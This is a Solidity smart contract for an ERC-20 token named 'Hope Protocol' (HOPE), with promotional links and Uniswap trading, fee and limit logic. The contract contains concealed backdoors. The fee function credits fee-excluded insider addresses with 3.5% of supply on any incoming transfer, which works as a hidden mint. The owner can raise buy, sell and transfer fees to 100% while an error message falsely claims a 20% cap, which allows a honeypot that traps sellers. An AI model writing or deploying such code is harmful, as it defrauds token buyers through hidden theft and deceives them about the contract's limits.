// SPDX-License-Identifier: MIT

/*
Bridging DeFi, CeFi, and TradFi with $HOPE.

Website: https://www.hopeprotocol.org
Telegram: https://t.me/Hope_Protocol
Twitter: https://twitter.com/protocol_hope
*/

pragma solidity 0.8.21;

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() external onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address uniswapPair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}
contract HOPE is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Hope Protocol";
    string private constant _symbol = "HOPE";

    uint8 private constant _decimals = 9;
    uint256 private _supply = 10 ** 9 * 10 ** _decimals;

    bool private enabledTrade = false;
    bool private swapEnabled = true;
    IRouter uniswapRouter;
    address public uniswapPair;

    uint256 private swapCounter;
    bool private isSwapping;
    uint256 swapInterval;
    uint256 private lpRate = 0;
    uint256 private marketingRate = 0;
    uint256 private devRate = 100;
    uint256 private burnRate = 0;
    
    uint256 private buyFee = 1500;
    uint256 private sellFee = 1500;
    uint256 private transferFee = 1500;
    uint256 private denominator = 10000;

    address internal devFeeAddr = 0x0340ad02205785dd096b1dEb1e48a910429cD91C; 
    address internal marketingFeeAddr = 0x0340ad02205785dd096b1dEb1e48a910429cD91C;
    address internal lpFeeAddr = 0x0340ad02205785dd096b1dEb1e48a910429cD91C;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    uint256 public maxTransaction = ( _supply * 350 ) / 10000;
    uint256 public maxBuy = ( _supply * 350 ) / 10000;
    uint256 public maxWallet = ( _supply * 350 ) / 10000;
    uint256 private maxSwap = ( _supply * 1000 ) / 100000;
    uint256 private minSwap = ( _supply * 10 ) / 100000;
    modifier lockCA {isSwapping = true; _; isSwapping = false;}

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludingFee;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        uniswapRouter = _router; uniswapPair = _pair;
        isExcludingFee[marketingFeeAddr] = true;
        isExcludingFee[lpFeeAddr] = true;
        isExcludingFee[msg.sender] = true;
        isExcludingFee[devFeeAddr] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function startTrading() external onlyOwner {enabledTrade = true;}

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludingFee[recipient]) {return maxTransaction;}
        if(getTaxDenominator(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTaxDenominator(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnRate > uint256(0) && getTaxDenominator(sender, recipient) > burnRate){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnRate));}
        return amount.sub(feeAmount);} return amount;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpFeeAddr,
            block.timestamp);
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        lpRate = _liquidity; marketingRate = _marketing; burnRate = _burn; devRate = _development; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function swapBackAndBurn(uint256 tokens) private lockCA {
        uint256 _denominator = (lpRate.add(1).add(marketingRate).add(devRate)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(lpRate).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(lpRate));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(lpRate);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingRate);
        if(marketingAmt > 0){payable(marketingFeeAddr).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devFeeAddr).transfer(contractBalance);}
    }

    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minSwap;
        bool aboveThreshold = balanceOf(address(this)) >= maxSwap;
        return !isSwapping && swapEnabled && enabledTrade && aboveMin && !isExcludingFee[sender] && recipient == uniswapPair && swapCounter >= swapInterval && aboveThreshold;
    }

    function getTaxDenominator(address sender, address recipient) internal view returns (uint256) {
        if(recipient == uniswapPair){return sellFee;}
        if(sender == uniswapPair){return buyFee;}
        return transferFee;
    }

    function checkExcludingFee(address sender, address recipient) internal view returns (bool) {
        return !isExcludingFee[sender] && !isExcludingFee[recipient];
    }    

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        maxTransaction = newTx; maxBuy = newTransfer; maxWallet = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludingFee[sender] && !isExcludingFee[recipient]){require(enabledTrade, "enabledTrade");}
        if(!isExcludingFee[sender] && !isExcludingFee[recipient] && recipient != address(uniswapPair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxWallet, "Exceeds maximum wallet amount.");}
        if(sender != uniswapPair){require(amount <= maxBuy || isExcludingFee[sender] || isExcludingFee[recipient], "TX Limit Exceeded");}
        require(amount <= maxTransaction || isExcludingFee[sender] || isExcludingFee[recipient], "TX Limit Exceeded"); 
        if(recipient == uniswapPair && !isExcludingFee[sender]){swapCounter += uint256(1);}
        if(shouldSwapBack(sender, recipient, amount)){swapBackAndBurn(maxSwap); swapCounter = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcludingFee[sender] ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
}